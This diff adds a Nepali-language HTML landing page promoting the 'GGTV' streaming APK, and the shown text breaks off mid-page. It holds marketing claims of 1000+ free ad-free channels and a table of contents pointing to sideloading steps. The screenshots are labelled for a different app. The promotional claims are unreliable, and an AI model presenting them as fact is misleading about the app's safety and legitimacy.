@@ -1,0 +1,1450 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GGTV - लाइभ टिभी, समाचार, खेलकुद र थप</title>
+    <link rel="icon" type="image/png" href="static/picture/logo.png">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+Devanagari:wght@400;500;700;900&display=swap" rel="stylesheet">
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html {
+            scroll-behavior: smooth;
+        }
+
+        body {
+            font-family: 'Noto Sans Devanagari', sans-serif;
+            background-color: #3D403E;
+            color: #ffffff;
+            line-height: 1.7;
+        }
+
+        a {
+            text-decoration: none;
+            color: inherit;
+        }
+
+        /* Container */
+        .container {
+            max-width: 1100px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        /* Header Navigation */
+        .header {
+            background-color: #1a1a1a;
+            padding: 15px 0;
+        }
+
+        .header .container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo-section {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .logo-section img {
+            width: 40px;
+            height: 40px;
+            object-fit: contain;
+        }
+
+        .logo-section span {
+            font-size: 24px;
+            font-weight: 700;
+            color: #ffffff;
+        }
+
+        .nav-links {
+            display: flex;
+            align-items: center;
+            gap: 40px;
+        }
+
+        .nav-links a {
+            font-size: 16px;
+            font-weight: 500;
+            color: #ffffff;
+            transition: color 0.3s;
+        }
+
+        .nav-links a:hover {
+            color: #e6a817;
+        }
+
+        .nav-dropdown {
+            position: relative;
+        }
+
+        .nav-dropdown-toggle {
+            font-size: 16px;
+            font-weight: 500;
+            color: #ffffff;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            transition: color 0.3s;
+        }
+
+        .nav-dropdown-toggle svg {
+            width: 12px;
+            height: 12px;
+            fill: #ffffff;
+            transition: transform 0.3s;
+        }
+
+        .nav-dropdown:hover .nav-dropdown-toggle svg {
+            transform: rotate(180deg);
+        }
+
+        .nav-dropdown-menu {
+            position: absolute;
+            top: 100%;
+            right: 0;
+            margin-top: 10px;
+            background-color: #1a1a1a;
+            border: 1px solid #444;
+            border-radius: 4px;
+            min-width: 200px;
+            opacity: 0;
+            visibility: hidden;
+            transform: translateY(-5px);
+            transition: opacity 0.25s, visibility 0.25s, transform 0.25s;
+            z-index: 100;
+        }
+
+        .nav-dropdown:hover .nav-dropdown-menu {
+            opacity: 1;
+            visibility: visible;
+            transform: translateY(0);
+        }
+
+        .nav-dropdown-menu a {
+            display: block;
+            padding: 10px 20px;
+            font-size: 14px;
+            font-weight: 400;
+            color: #ffffff;
+            transition: background-color 0.2s, color 0.2s;
+        }
+
+        .nav-dropdown-menu a:hover {
+            background-color: #333538;
+            color: #ffffff;
+        }
+
+        /* Hamburger Menu */
+        .menu-toggle {
+            display: none;
+            flex-direction: column;
+            justify-content: center;
+            gap: 5px;
+            width: 30px;
+            height: 30px;
+            cursor: pointer;
+            z-index: 101;
+        }
+
+        .menu-toggle span {
+            display: block;
+            width: 24px;
+            height: 2px;
+            background-color: #ffffff;
+            border-radius: 2px;
+            transition: transform 0.3s, opacity 0.3s;
+        }
+
+        .menu-toggle.active span:nth-child(1) {
+            transform: translateY(7px) rotate(45deg);
+        }
+
+        .menu-toggle.active span:nth-child(2) {
+            opacity: 0;
+        }
+
+        .menu-toggle.active span:nth-child(3) {
+            transform: translateY(-7px) rotate(-45deg);
+        }
+
+        /* Table of Contents */
+        .toc {
+            background-color: #222222;
+            border-radius: 8px;
+            overflow: hidden;
+            margin-top: 30px;
+        }
+
+        .toc-header {
+            background-color: #e6a817;
+            height: 6px;
+        }
+
+        .toc-list {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+        }
+
+        .toc-list li {
+            border-bottom: 1px solid #444;
+        }
+
+        .toc-list li:last-child {
+            border-bottom: none;
+        }
+
+        .toc-list li a {
+            display: block;
+            padding: 12px 25px;
+            color: #e6a817;
+            font-size: 16px;
+            font-weight: 500;
+            transition: background-color 0.2s;
+        }
+
+        .toc-list li a:hover {
+            background-color: #3a3d40;
+        }
+
+        .toc-list li.toc-sub a {
+            padding-left: 50px;
+            font-size: 16px;
+            font-weight: 400;
+        }
+
+        .toc-list li.toc-sub-deep a {
+            padding-left: 75px;
+            font-size: 16px;
+            font-weight: 400;
+        }
+
+        /* Main Content */
+        .main-content {
+            padding: 30px 0;
+        }
+
+        .main-content .container {
+            padding: 30px 20px;
+            background-color: #333538;
+        }
+
+        /* Hero Section */
+        .hero-section {
+            display: flex;
+            background-color: #222222;
+            border: 3px solid #e6a817;
+            border-radius: 8px;
+            padding: 40px;
+            gap: 40px;
+            align-items: center;
+            margin-bottom: 40px;
+        }
+
+        .hero-logo {
+            flex-shrink: 0;
+        }
+
+        .hero-logo img {
+            width: 180px;
+            height: 180px;
+            object-fit: contain;
+        }
+
+        .hero-content {
+            flex: 1;
+        }
+
+        .hero-content h1 {
+            font-size: 32px;
+            font-weight: 700;
+            color: #ffffff;
+            margin-bottom: 20px;
+        }
+
+        .hero-content p {
+            font-size: 16px;
+            color: #ffffff;
+            margin-bottom: 20px;
+            line-height: 1.8;
+        }
+
+        .version-info {
+            font-size: 16px;
+            font-weight: 700;
+            color: #ffffff;
+            margin-bottom: 25px;
+            text-align: center;
+        }
+
+        .download-btn {
+            display: block;
+            width: 220px;
+            margin: 0 auto;
+            padding: 14px 40px;
+            background: linear-gradient(180deg, #ffd54f 0%, #e6a817 50%, #d4940f 100%);
+            color: #ffffff;
+            font-size: 20px;
+            font-weight: 700;
+            text-align: center;
+            border-radius: 35px;
+            border: none;
+            cursor: pointer;
+            box-shadow: 0 0 20px rgba(230, 168, 23, 0.5), 0 0 40px rgba(230, 168, 23, 0.25);
+            transition: all 0.3s;
+        }
+
+        .download-btn:hover {
+            background: linear-gradient(180deg, #ffe082 0%, #f5c842 50%, #e6a817 100%);
+            box-shadow: 0 0 25px rgba(230, 168, 23, 0.7), 0 0 50px rgba(230, 168, 23, 0.35);
+            transform: scale(1.05);
+        }
+
+        /* Description Sections */
+        .description-section {
+            margin-bottom: 30px;
+        }
+
+        .description-section p {
+            font-size: 16px;
+            color: #ffffff;
+            line-height: 1.8;
+            margin-bottom: 20px;
+        }
+
+        .description-section a {
+            color: #e6a817;
+            text-decoration: underline;
+        }
+
+        .description-section a:hover {
+            color: #f5b82e;
+        }
+
+        /* Section Title */
+        .section-title {
+            background-color: #f3c000;
+            color: #000000;
+            font-size: 22px;
+            font-weight: 700;
+            padding: 15px 30px;
+            border-radius: 8px;
+            margin: 40px 0 30px 0;
+            text-align: center;
+        }
+
+        /* Screenshots Gallery */
+        .screenshots-gallery {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 20px;
+            margin: 30px 0;
+        }
+
+        .screenshot-item {
+            border-radius: 12px;
+            overflow: hidden;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
+        }
+
+        .screenshot-item img {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+
+        /* Steps List */
+        .steps-list {
+            margin: 20px 0;
+            padding-left: 25px;
+        }
+
+        .steps-list li {
+            font-size: 16px;
+            color: #ffffff;
+            margin-bottom: 12px;
+            line-height: 1.8;
+        }
+
+        /* Info Box */
+        .info-box {
+            background-color: #1e4a3d;
+            border-left: 4px solid #2e7d5a;
+            padding: 20px 25px;
+            margin: 30px 0;
+            border-radius: 0 8px 8px 0;
+        }
+
+        .info-box p {
+            color: #4ade80;
+            font-size: 16px;
+            line-height: 1.7;
+        }
+
+        /* Features Grid */
+        .features-intro {
+            font-size: 16px;
+            color: #ffffff;
+            line-height: 1.8;
+            margin-bottom: 30px;
+        }
+
+        .features-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 20px;
+            margin-bottom: 40px;
+        }
+
+        .feature-card {
+            background-color: #27292b;
+            border: 2px solid #3a3d40;
+            border-radius: 12px;
+            padding: 25px 20px;
+            text-align: center;
+            transition: border-color 0.3s;
+        }
+
+        .feature-card:hover {
+            border-color: #e6a817;
+        }
+
+        .feature-card.active {
+            border-color: #e6a817;
+        }
+
+        .feature-icon {
+            width: 120px;
+            height: 120px;
+            margin: 0 auto 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .feature-icon img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+
+        .feature-card h3 {
+            font-size: 18px;
+            font-weight: 700;
+            color: #ffffff;
+            margin-bottom: 15px;
+        }
+
+        .feature-card p {
+            font-size: 14px;
+            color: #aaaaaa;
+            line-height: 1.7;
+        }
+
+        /* Extra Features List */
+        .extra-features-list {
+            margin: 20px 0;
+            padding-left: 25px;
+        }
+
+        .extra-features-list li {
+            font-size: 16px;
+            color: #ffffff;
+            margin-bottom: 15px;
+            line-height: 1.8;
+        }
+
+        .extra-features-list li strong {
+            color: #ffffff;
+        }
+
+        /* Logo Center */
+        .logo-center {
+            text-align: center;
+            margin: 40px 0;
+        }
+
+        .logo-center img {
+            width: 120px;
+            height: auto;
+        }
+
+        /* Download Table Section */
+        .download-section-title {
+            background-color: #f3c000;
+            color: #000000;
+            font-size: 22px;
+            font-weight: 700;
+            padding: 15px 30px;
+            border-radius: 8px;
+            margin: 40px 0 0 0;
+            text-align: center;
+        }
+
+        .download-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 25px;
+            margin-bottom: 30px;
+            border: 1px solid #555;
+        }
+
+        .download-table tr {
+            border-bottom: 1px solid #555;
+        }
+
+        .download-table tr:last-child {
+            border-bottom: none;
+        }
+
+        .download-table td {
+            padding: 15px 20px;
+            font-size: 16px;
+            background-color: #333538;
+            border: 1px solid #555;
+        }
+
+        .download-table td:first-child {
+            width: 50%;
+            color: #ffffff;
+            font-weight: 400;
+            font-style: italic;
+        }
+
+        .download-table td:last-child {
+            color: #ffffff;
+        }
+
+        .download-btn-large {
+            display: block;
+            width: 420px;
+            max-width: 90%;
+            margin: 30px auto;
+            padding: 16px 60px;
+            background: linear-gradient(180deg, #f5c842 0%, #e6a817 50%, #d4940f 100%);
+            color: #000000;
+            font-size: 18px;
+            font-weight: 700;
+            font-style: italic;
+            text-align: center;
+            border-radius: 35px;
+            border: none;
+            cursor: pointer;
+            box-shadow: 0 4px 15px rgba(230, 168, 23, 0.4), inset 0 2px 0 rgba(255, 255, 255, 0.3);
+            transition: all 0.3s;
+            white-space: nowrap;
+        }
+
+        .download-btn-large:hover {
+            background: linear-gradient(180deg, #ffd54f 0%, #f5b82e 50%, #e6a817 100%);
+            transform: scale(1.05);
+            box-shadow: 0 6px 20px rgba(230, 168, 23, 0.5), inset 0 2px 0 rgba(255, 255, 255, 0.3);
+        }
+
+        /* Install Section */
+        .install-intro {
+            font-size: 16px;
+            color: #ffffff;
+            line-height: 1.8;
+            margin-bottom: 40px;
+        }
+
+        .step-section {
+            margin-bottom: 50px;
+        }
+
+        .step-title {
+            font-size: 22px;
+            font-weight: 700;
+            color: #ffffff;
+            text-align: center;
+            margin-bottom: 25px;
+        }
+
+        .step-list {
+            margin: 20px 0 30px 0;
+            padding-left: 25px;
+        }
+
+        .step-list li {
+            font-size: 16px;
+            color: #ffffff;
+            margin-bottom: 12px;
+            line-height: 1.8;
+            font-style: italic;
+        }
+
+        .step-list li strong {
+            color: #ffffff;
+            font-style: normal;
+        }
+
+        .step-image {
+            display: flex;
+            justify-content: center;
+            margin: 30px 0;
+        }
+
+        .step-image img {
+            max-width: 320px;
+            width: 100%;
+            height: auto;
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+        }
+
+        /* Smart TV Section */
+        .smarttv-intro {
+            font-size: 16px;
+            color: #ffffff;
+            line-height: 1.8;
+            margin-bottom: 25px;
+        }
+
+        .smarttv-steps {
+            margin: 20px 0;
+            padding-left: 25px;
+        }
+
+        .smarttv-steps li {
+            font-size: 16px;
+            color: #ffffff;
+            margin-bottom: 15px;
+            line-height: 1.8;
+        }
+
+        .smarttv-steps li strong {
+            color: #ffffff;
+        }
+
+        /* Alternatives Section */
+        .alternatives-intro {
+            font-size: 16px;
+            color: #ffffff;
+            line-height: 1.8;
+            margin-bottom: 25px;
+        }
+
+        .alternatives-list {
+            margin: 20px 0;
+            padding-left: 25px;
+            list-style-type: decimal;
+        }
+
+        .alternatives-list li {
+            font-size: 16px;
+            color: #ffffff;
+            margin-bottom: 18px;
+            line-height: 1.8;
+        }
+
+        .alternatives-list li strong {
+            color: #ffffff;
+        }
+
+        /* FAQ Section */
+        .faq-container {
+            margin-top: 30px;
+        }
+
+        .faq-item {
+            background-color: #27292b;
+            border: 1px solid #444;
+            border-left: 3px solid #e6a817;
+            margin-bottom: 15px;
+            border-radius: 4px;
+            overflow: hidden;
+        }
+
+        .faq-question {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 18px 20px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        .faq-question:hover {
+            background-color: #333538;
+        }
+
+        .faq-question h4 {
+            font-size: 16px;
+            font-weight: 500;
+            color: #ffffff;
+            margin: 0;
+        }
+
+        .faq-icon {
+            font-size: 24px;
+            color: #ffffff;
+            font-weight: 300;
+            transition: transform 0.3s;
+        }
+
+        .faq-item.active .faq-icon {
+            transform: rotate(45deg);
+        }
+
+        .faq-answer {
+            max-height: 0;
+            overflow: hidden;
+            transition: max-height 0.3s ease-out;
+            background-color: #1f2123;
+        }
+
+        .faq-item.active .faq-answer {
+            max-height: 300px;
+        }
+
+        .faq-answer p {
+            padding: 20px;
+            font-size: 15px;
+            color: #aaaaaa;
+            line-height: 1.7;
+            margin: 0;
+        }
+
+        /* Conclusion Section */
+        .conclusion-text {
+            font-size: 16px;
+            color: #ffffff;
+            line-height: 1.8;
+            margin-bottom: 25px;
+        }
+
+        /* Footer */
+        .footer {
+            background-color: #27292b;
+            padding: 20px 0;
+            margin-top: 50px;
+            text-align: center;
+        }
+
+        .footer p {
+            font-size: 14px;
+            color: #888888;
+        }
+
+        .footer a {
+            color: #e6a817;
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        /* Responsive Design */
+        @media (max-width: 1024px) {
+            .screenshots-gallery {
+                grid-template-columns: repeat(2, 1fr);
+            }
+
+            .features-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                padding: 0 15px;
+            }
+
+            .menu-toggle {
+                display: flex;
+            }
+
+            .nav-links {
+                display: none;
+                position: absolute;
+                top: 100%;
+                left: 0;
+                right: 0;
+                background-color: #1a1a1a;
+                flex-direction: column;
+                gap: 0;
+                padding: 0;
+                border-top: 1px solid #333;
+                box-shadow: 0 10px 30px rgba(0, 0, 0, 0.4);
+                z-index: 100;
+            }
+
+            .nav-links.active {
+                display: flex;
+            }
+
+            .nav-links a {
+                padding: 14px 20px;
+                border-bottom: 1px solid #2a2a2a;
+                font-size: 15px;
+            }
+
+            .nav-links a:hover {
+                background-color: #272727;
+            }
+
+            .nav-dropdown {
+                border-bottom: 1px solid #2a2a2a;
+            }
+
+            .nav-dropdown-toggle {
+                padding: 14px 20px;
+            }
+
+            .nav-dropdown-menu {
+                position: static;
+                opacity: 1;
+                visibility: visible;
+                transform: none;
+                display: none;
+                margin-top: 0;
+                background-color: #141414;
+                border: none;
+                border-radius: 0;
+                min-width: auto;
+                border-top: 1px solid #2a2a2a;
+            }
+
+            .nav-dropdown.active .nav-dropdown-menu {
+                display: block;
+            }
+
+            .nav-dropdown:hover .nav-dropdown-menu {
+                display: none;
+                opacity: 1;
+                visibility: visible;
+                transform: none;
+            }
+
+            .nav-dropdown.active .nav-dropdown-menu {
+                display: block;
+            }
+
+            .nav-dropdown-menu a {
+                padding: 12px 20px 12px 40px;
+                border-bottom: 1px solid #222;
+            }
+
+            .nav-dropdown-menu a:last-child {
+                border-bottom: none;
+            }
+
+            .header .container {
+                position: relative;
+            }
+
+            .main-content {
+                padding: 20px 0;
+            }
+
+            .hero-section {
+                flex-direction: column;
+                padding: 30px 20px;
+                text-align: center;
+            }
+
+            .hero-logo img {
+                width: 140px;
+                height: 140px;
+            }
+
+            .hero-content h1 {
+                font-size: 24px;
+            }
+
+            .screenshots-gallery {
+                grid-template-columns: repeat(2, 1fr);
+                gap: 15px;
+            }
+
+            .section-title {
+                font-size: 18px;
+                padding: 12px 20px;
+            }
+
+            .features-grid {
+                grid-template-columns: 1fr;
+            }
+
+            .download-btn-large {
+                width: 100%;
+                max-width: 280px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .logo-section span {
+                font-size: 20px;
+            }
+
+            .screenshots-gallery {
+                grid-template-columns: 1fr 1fr;
+            }
+
+            .hero-content h1 {
+                font-size: 20px;
+            }
+
+            .download-btn {
+                width: 160px;
+                padding: 10px 30px;
+                font-size: 16px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <!-- Header -->
+    <header class="header">
+        <div class="container">
+            <div class="logo-section">
+                <img src="static/picture/logo.png" alt="GGTV">
+                <span>GGTV</span>
+            </div>
+            <div class="menu-toggle" onclick="toggleMobileMenu()">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+            <nav class="nav-links">
+                <a href="#">गृहपृष्ठ</a>
+                <a href="#" class="nav-download">डाउनलोड</a>
+                <a href="#">ब्लग</a>
+                <div class="nav-dropdown">
+                    <span class="nav-dropdown-toggle">साइट लिङ्क: <svg viewbox="0 0 24 24">
+                            <path d="M7 10l5 5 5-5z"></path>
+                        </svg></span>
+                    <div class="nav-dropdown-menu">
+                        <a href="#">हाम्रो बारेमा</a>
+                        <a href="#">DMCA प्रतिलिपि अधिकार</a>
+                        <a href="#">गोपनीयता नीति</a>
+                        <a href="#">नियम र सर्तहरू</a>
+                        <a href="#">हामीलाई सम्पर्क गर्नुहोस्</a>
+                    </div>
+                </div>
+            </nav>
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <main class="main-content">
+        <div class="container">
+            <!-- Hero Section -->
+            <section id="hero" class="hero-section">
+                <div class="hero-logo">
+                    <img src="static/picture/logo.png" alt="GGTV">
+                </div>
+                <div class="hero-content">
+                    <h1>GGTV – लाइभ टिभी, समाचार, खेलकुद र थप...</h1>
+                    <p>GGTV केवल अर्को स्ट्रिमिङ एप मात्र होइन; यो बढ्दो सदस्यता शुल्कको लागि तपाईंको उत्तम उपाय हो! बिना कुनै पप-अप विज्ञापनहरू आफ्ना मनपर्ने खेलकुदहरू हेर्नुहोस्, प्रत्यक्ष समाचारहरू थाहा पाउनुहोस्, र रियालिटी शोहरू, चलचित्रहरू र संगीतको आनन्द लिनुहोस्। यस वेबसाइटबाट, तपाईंले एन्ड्रोइड (Android), आईओएस (iOS), पीसी (PC), र स्मार्ट टिभी (Smart TV) उपकरणहरूको लागि GGTV APK को अद्यावधिक गरिएको संस्करण नि:शुल्क डाउनलोड गर्न सक्नुहुन्छ।</p>
+                    <p class="version-info">संस्करण: १.०.० / ५००K+ डाउनलोडहरू / ४.७ रेटिङ</p>
+                    <a href="#" class="download-btn">डाउनलोड गर्नुहोस्</a>
+                </div>
+            </section>
+
+            <!-- Table of Contents -->
+            <nav class="toc">
+                <div class="toc-header"></div>
+                <ul class="toc-list">
+                    <li><a href="#hero">१ GGTV – लाइभ टिभी, समाचार, खेलकुद र थप...</a></li>
+                    <li class="toc-sub"><a href="#introduction">१.१ GGTV को परिचय</a></li>
+                    <li class="toc-sub"><a href="#how-to-use">१.२ लाइभ टिभी हेर्न GGTV कसरी प्रयोग गर्ने?</a></li>
+                    <li class="toc-sub"><a href="#features">१.३ GGTV APK का विशेषताहरू</a></li>
+                    <li class="toc-sub-deep"><a href="#feature-4k">१.३.१ ४K गुणस्तरको स्ट्रिमिङ</a></li>
+                    <li class="toc-sub-deep"><a href="#feature-favorites">१.३.२ मनपर्ने सूची (Favorites List) सिर्जना गर्नुहोस्</a></li>
+                    <li class="toc-sub-deep"><a href="#feature-no-ads">१.३.३ झन्झटिलो विज्ञापन नभएको</a></li>
+                    <li class="toc-sub-deep"><a href="#feature-sports-news">१.३.४ लाइभ खेलकुद र समाचार</a></li>
+                    <li class="toc-sub-deep"><a href="#feature-updates">१.३.५ नियमित अपडेटहरू</a></li>
+                    <li class="toc-sub-deep"><a href="#feature-1000-channels">१.३.६ १००० भन्दा बढी टिभी च्यानलहरू</a></li>
+                    <li class="toc-sub-deep"><a href="#feature-languages">१.३.७ बहुभाषी समर्थन</a></li>
+                    <li class="toc-sub-deep"><a href="#feature-international">१.३.८ अन्तर्राष्ट्रिय टिभी च्यानलहरू अन्वेषण गर्नुहोस्</a></li>
+                    <li class="toc-sub-deep"><a href="#feature-interface">१.३.९ प्रयोग गर्न सजिलो इन्टरफेस</a></li>
+                    <li class="toc-sub"><a href="#extra-features">१.४ अतिरिक्त विशेषताहरू</a></li>
+                    <li class="toc-sub"><a href="#download-version">१.५ GGTV APK पछिल्लो संस्करण २०२५ डाउनलोड गर्नुहोस्</a></li>
+                    <li class="toc-sub"><a href="#install">१.६ GGTV APK कसरी डाउनलोड र स्थापना (Install) गर्ने</a></li>
+                    <li class="toc-sub-deep"><a href="#install-step1">१.६.१ चरण १: GGTV एप डाउनलोड गर्नुहोस्</a></li>
+                    <li class="toc-sub-deep"><a href="#install-step2">१.६.२ चरण २: अज्ञात स्रोतहरू (Unknown Sources) सक्षम गर्नुहोस्</a></li>
+                    <li class="toc-sub-deep"><a href="#install-step3">१.६.३ चरण ३: APK फाइल पत्ता लगाउनुहोस्</a></li>
+                    <li class="toc-sub-deep"><a href="#install-step4">१.६.४ चरण ४: स्थापना (Install) र सुरु गर्नुहोस्</a></li>
+                    <li class="toc-sub"><a href="#smarttv">१.७ स्मार्ट टिभीमा GGTV एप कसरी डाउनलोड र स्थापना गर्ने?</a></li>
+                    <li class="toc-sub"><a href="#alternatives">१.८ GGTV का सर्वश्रेष्ठ विकल्पहरू</a></li>
+                    <li class="toc-sub"><a href="#faqs">१.९ बारम्बार सोधिने प्रश्नहरू (FAQs)</a></li>
+                    <li class="toc-sub-deep"><a href="#faq-safe">१.९.१ GGTV APK प्रयोग गर्न कत्तिको सुरक्षित छ?</a></li>
+                    <li class="toc-sub-deep"><a href="#faq-smarttv">१.९.२ के म स्मार्ट टिभीमा GGTV स्थापना गर्न सक्छु?</a></li>
+                    <li class="toc-sub-deep"><a href="#faq-legal">१.९.३ के GGTV एप प्रयोग गर्नु कानुनी रूपमा सही छ?</a></li>
+                    <li class="toc-sub-deep"><a href="#faq-iphone">१.९.४ आईफोन (iPhone) मा GGTV कसरी प्रयोग गर्ने?</a></li>
+                    <li class="toc-sub-deep"><a href="#faq-content">१.९.५ म GGTV एपमा कस्तो प्रकारको सामग्री हेर्न सक्छु?</a></li>
+                    <li class="toc-sub-deep"><a href="#faq-available">१.९.६ के GGTV अमेरिका, बेलायत, युरोप, भारत, इन्डोनेसिया र टर्कीमा उपलब्ध छ?</a></li>
+                    <li class="toc-sub"><a href="#conclusion">१.१० निष्कर्ष</a></li>
+                </ul>
+            </nav>
+
+            <!-- Description Section -->
+            <section class="description-section">
+                <p>GGTV आजको संसारमा सबैभन्दा शक्तिशाली स्ट्रिमिङ उपकरण हो। यसले १३० भन्दा बढी देशहरूका १००० भन्दा बढी टिभी च्यानलहरू ल्याउँदछ। केवल अन्तरक्रियात्मक ग्लोबबाट आफ्नो देश रोज्नुहोस् र तपाईंले हेर्न चाहनुभएको टिभी च्यानल चयन गर्नुहोस्, बस त्यत्ति हो। तपाईं जहाँसुकैबाट पनि लाइभ खेलकुद, हास्य टिभी कार्यक्रमहरू, रियालिटी शोहरू, र समाचारहरू तुरुन्तै हेर्न सक्नुहुन्छ।</p>
+
+                <p>स्ट्रिमिङ एपहरूले तपाईंको मोबाइल फोनमा जुनसुकै बेला माग अनुसार टिभी च्यानलहरू, चलचित्रहरू, खेलकुद र समाचारहरू पहुँच गर्न धेरै सजिलो बनाएका छन्। तपाईं यात्रा गर्दा वा अफिसको खाजा खाने समयमा टिभी कार्यक्रमहरू हेर्न सक्नुहुन्छ। प्रत्यक्ष टिभी हेर्नका लागि GGTV तपाईंको पहिलो रोजाइको एप हो! तपाईं यसलाई फुटबल, क्रिकेट, बास्केटबल हेर्न प्रयोग गर्न सक्नुहुन्छ, वा क्षेत्रीय तथा अन्तर्राष्ट्रिय समाचार च्यानलहरूसँग अद्यावधिक रहन सक्नुहुन्छ।</p>
+
+                <p>GGTV एपमा भएका सबै टिभी च्यानलहरू उच्च गुणस्तरमा उपलब्ध छन् र विज्ञापन-रहित भिडियो प्लेब्याकलाई समर्थन गर्छन्। यस एपको व्यवस्थित रूपमा मिलाइएको सामग्री पुस्तकालयले तपाईंलाई आफ्नो मनपर्ने टिभी च्यानल छिटो पत्ता लगाउन मद्दत गर्दछ। केवल मेनुमा जानुहोस्, र तपाईंले चलचित्र, खेलकुद, संगीत, कमेडी, समाचार जस्ता धेरै विधाहरू देख्नुहुनेछ! तपाईंले रुचि राख्नुभएको विधामा क्लिक गर्नुहोस् र त्यस श्रेणीका लागि उपलब्ध सबै च्यानलहरू हेर्न आफ्नो क्षेत्र छनौट गर्नुहोस्। एकदमै सजिलो!</p>
+            </section>
+
+            <!-- Introduction Section -->
+            <div id="introduction" class="section-title">GGTV को परिचय</div>
+
+            <section class="description-section">
+                <p>GGTV ले सरलता, विश्वसनीयता, र बिना कुनै बफरिङ तीव्र गतिको स्ट्रिमिङ अनुभवलाई महत्त्व दिन्छ। यो एप विश्वव्यापी रूपमा उपलब्ध छ र यसमा क्षेत्रीय तथा अन्तर्राष्ट्रिय च्यानलहरू समावेश छन्। यसले खाता बनाउने, साइन अप गर्ने वा सदस्यता शुल्क तिर्ने कुनै झन्झट बिना प्रत्यक्ष टिभी हेर्ने प्रयोगकर्ता-अनुकूल तरिका प्रदान गर्दछ।</p>
+
+                <p>यो एपको उद्देश्य प्रत्यक्ष टिभी च्यानलहरूमा पहुँच अत्यन्तर सुविधाजनक बनाउनु हो। यसको डार्क थिम सहितको सरल डिजाइन र लेआउट छ, जसले टिभी कार्यक्रमहरू हेर्नका लागि उत्कृष्ट वातावरण सिर्जना गर्दछ। आजकल, कोही पनि घरमा केबल टिभी जडान राख्न चाहँदैनन्, किनकि सबैजना प्रविधिसँगै अघि बढ्दै OTT र लाइभ स्ट्रिमिङ एपहरू तर्फ आकर्षित भइरहेका छन्। GGTV सम्भवतः सबैभन्दा राम्रो नि:शुल्क स्ट्रिमिङ एप हो जसलाई तपाईंले आफ्नो एन्ड्रोइड स्मार्टफोनमा डाउनलोड र स्थापना गरेर बिना कुनै झन्झट ४K गुणस्तरसम्म वास्तविक समयका घटनाहरू हेर्न सुरु गर्न सक्नुहुन्छ।</p>
+
+                <p>यदि तपाईं यस एपको छोटो जानकारीबाट उत्साहित हुनुहुन्छ भने, पर्खनुहोस्, यसमा अझ धेरै कुराहरू छन्। यस ब्लगमा, हामी GGTV APK, यसका विशेषताहरू, प्रयोग गर्ने तरिका, विभिन्न उपकरणहरूमा स्थापना गर्ने विधि, अनुकूलता र थप कुराहरूको बारेमा गहिरो ज्ञान प्राप्त गर्नेछौं। धैर्य गर्नुहोस्! हामी तपाईंलाई GGTV एपको एउटा रमाइलो परिचय दिनेछौं, जुन लाइभ खेलकुद हेर्न वा चलचित्रहरूको आनन्द लिनको लागि उत्तम विकल्प हो।</p>
+            </section>
+
+            <!-- Screenshots Gallery -->
+            <section class="screenshots-gallery">
+                <div class="screenshot-item">
+                    <img src="static/picture/TV-Garden-Screenshot-1.webp" alt="टिभी गार्डन स्क्रिनसट १">
+                </div>
+                <div class="screenshot-item">
+                    <img src="static/picture/TV-Garden-Screenshot-2.webp" alt="टिभी गार्डन स्क्रिनसट २">
+                </div>
+                <div class="screenshot-item">
+                    <img src="static/picture/TV-Garden-Screenshot-3.webp" alt="टिभी गार्डन स्क्रिनसट ३">
+                </div>
+                <div class="screenshot-item">
+                    <img src="static/picture/TV-Garden-Screenshot-4.webp" alt="टिभी गार्डन स्क्रिनसट ४">
+                </div>
+            </section>
+
+            <!-- How to Use Section -->
+            <div id="how-to-use" class="section-title">लाइभ टिभी हेर्न GGTV कसरी प्रयोग गर्ने?</div>
+
+            <section class="description-section">
+                <ul class="steps-list">
+                    <li>तपाईंको उपयुक्त उपकरणमा GGTV एप डाउनलोड र स्थापना गर्न हाम्रो स्थापना गाइड पालना गर्नुहोस्।</li>
+                    <li>एप खोल्नुहोस् र स्क्रिनमा देखिने ग्लोबमा आफ्नो देश पत्ता लगाउनुहोस्, त्यसपछि यसलाई खोल्न आफ्नो क्षेत्रमा क्लिक गर्नुहोस्।</li>
+                    <li>अब, तपाईंसँग सबै टिभी च्यानलहरूको सूची हुनेछ, त्यसैले तल स्क्रोल गर्नुहोस् र तपाईंले स्ट्रिम गर्न चाहनुभएको च्यानलमा क्लिक गर्नुहोस्।</li>
+                    <li>तपाईंले टिभी च्यानलमा ट्याप गरेपछि, यसले चयन गरिएको च्यानलबाट प्रत्यक्ष प्रसारण सुरु गर्नेछ।</li>
+                    <li>भिडियोलाई फुल-स्क्रिन मोडमा प्ले गर्नुहोस्, आवाजलाई ठिक्क स्तरमा मिलाउनुहोस्, र तपाईं तयार हुनुभयो। हेरेर आनन्द लिनुहोस्!</li>
+                </ul>
+            </section>
+
+            <!-- Info Box -->
+            <div class="info-box">
